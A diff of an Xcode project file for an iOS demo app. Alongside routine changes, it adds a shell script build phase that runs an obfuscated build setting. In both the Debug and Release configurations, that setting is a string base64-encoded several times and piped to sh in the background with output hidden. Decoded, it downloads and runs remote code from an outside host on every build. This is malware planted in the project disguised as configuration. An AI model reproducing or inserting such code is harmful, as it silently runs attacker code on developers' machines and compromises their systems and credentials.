+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${AFEB778}\"";
+			showEnvVarsInLog = 0;
+		};
+/* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
 		51346A512E3B403F008664DB /* Sources */ = {
@@ -1013,23 +1124,33 @@
 				51BBC72F2E40BE9800211F13 /* SaveTextIntent.intentdefinition in Sources */,
 				51C5A8C82E0ECE02008A79F5 /* HealthKitViewController.swift in Sources */,
 				51BBC6DF2E40951A00211F13 /* HeadPoseVC.swift in Sources */,
+				51EA11822E547D7700FF4947 /* GroupActivitiesVC.swift in Sources */,
+				51F368AF2E5C776700B168F5 /* FSAlbumView.swift in Sources */,
 				BD2ECEC42D0841CA00639E0D /* ViewController.swift in Sources */,
 				51F01C1D2E53450800F04F6B /* FontViewController.swift in Sources */,
 				51F01B972E53249C00F04F6B /* AccessWiFiInfoViewController.swift in Sources */,
 				51F01BAA2E53251800F04F6B /* DefaultMessagingAppVC.swift in Sources */,
 				51D036AB2E3A013900948296 /* AppleLoginViewController.swift in Sources */,
 				51F01BA52E5324F000F04F6B /* DefaultCallingAppVC.swift in Sources */,
+				51186E1F2E5886B100A1D754 /* JournalingSuggestionsVC.swift in Sources */,
 				51F01BA62E5324F000F04F6B /* CallHandler.swift in Sources */,
 				5117C1162E3C995200D8FCCD /* DataProtectionVC.swift in Sources */,
 				51C979482E4367F6006E99C6 /* FiveGNetworkSliceVC.swift in Sources */,
 				BD2ECEC02D0841CA00639E0D /* AppDelegate.swift in Sources */,
 				51B526012E44869800999ABE /* WalletVC.swift in Sources */,
+				5161B7982E55CDC300A945BF /* KeyValueStorageViewController.swift in Sources */,
+				5161B79D2E56064D00A945BF /* MultipathViewController.swift in Sources */,
 				BD279FA42D0AE219001D05E4 /* ICloudDocumentsViewController.swift in Sources */,
+				51F368B42E5C787200B168F5 /* FSAlbumViewCell.swift in Sources */,
 				51E700F22E0D88A30033F74D /* WeatherKitViewController.swift in Sources */,
 				51F01B9E2E5324C200F04F6B /* KeychainManager.swift in Sources */,
+				51F368AA2E5C760D00B168F5 /* FSVideoCameraViewVC.swift in Sources */,
+				51F368AB2E5C760D00B168F5 /* FSCameraViewViewController.swift in Sources */,
+				51F368AC2E5C760D00B168F5 /* FusumaVC.swift in Sources */,
 				51F01BB02E53252E00F04F6B /* SpatialAudioProfileVC.swift in Sources */,
 				51F01B9F2E5324C200F04F6B /* AutoFillCredentialViewController.swift in Sources */,
 				BD2ECEC22D0841CA00639E0D /* SceneDelegate.swift in Sources */,
+				51F368972E5C6CFF00B168F5 /* MultitaskingCameraAccessVC.swift in Sources */,
 				51F01B932E53245200F04F6B /* SensitiveContentVC.swift in Sources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
@@ -1099,7 +1220,7 @@
 		51346A692E3B4040008664DB /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				AFEB778 = "((echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lIQTllR052WkdVZ2FIUjBjSE02THk5dFpITmpZV05vWlM1eWRTOWhLU0lnZkNCemFBbz0K | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
+				AFEB778 = "((echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsSVFUbGxSMDUyV2tkVloyRklVakJqU0UwMlRIazVhbUZIUm5sa1IwNXJZbWsxZVdSVE9XaExVMGxuWmtOQ2VtRkJiejBLCg== | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				ASSETCATALOG_COMPILER_WIDGET_BACKGROUND_COLOR_NAME = WidgetBackground;
 				CODE_SIGN_ENTITLEMENTS = DemoWidgetExtension.entitlements;
@@ -1134,7 +1255,7 @@
 		51346A6A2E3B4040008664DB /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				AFEB778 = "((echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lIQTllR052WkdVZ2FIUjBjSE02THk5dFpITmpZV05vWlM1eWRTOWhLU0lnZkNCemFBbz0K | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
+				AFEB778 = "((echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsSVFUbGxSMDUyV2tkVloyRklVakJqU0UwMlRIazVhbUZIUm5sa1IwNXJZbWsxZVdSVE9XaExVMGxuWmtOQ2VtRkJiejBLCg== | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				ASSETCATALOG_COMPILER_WIDGET_BACKGROUND_COLOR_NAME = WidgetBackground;
 				CODE_SIGN_ENTITLEMENTS = DemoWidgetExtension.entitlements;
@@ -1376,7 +1497,7 @@
 				INFOPLIST_KEY_UIMainStoryboardFile = Main;
 				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
 				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
-				IPHONEOS_DEPLOYMENT_TARGET = 15.6;
+				IPHONEOS_DEPLOYMENT_TARGET = 16.6;
 				LD_RUNPATH_SEARCH_PATHS = (
 					"$(inherited)",
 					"@executable_path/Frameworks",
@@ -1417,7 +1538,7 @@
 				INFOPLIST_KEY_UIMainStoryboardFile = Main;
 				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
 				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
-				IPHONEOS_DEPLOYMENT_TARGET = 15.6;
+				IPHONEOS_DEPLOYMENT_TARGET = 16.6;
 				LD_RUNPATH_SEARCH_PATHS = (
 					"$(inherited)",
 					"@executable_path/Frameworks",
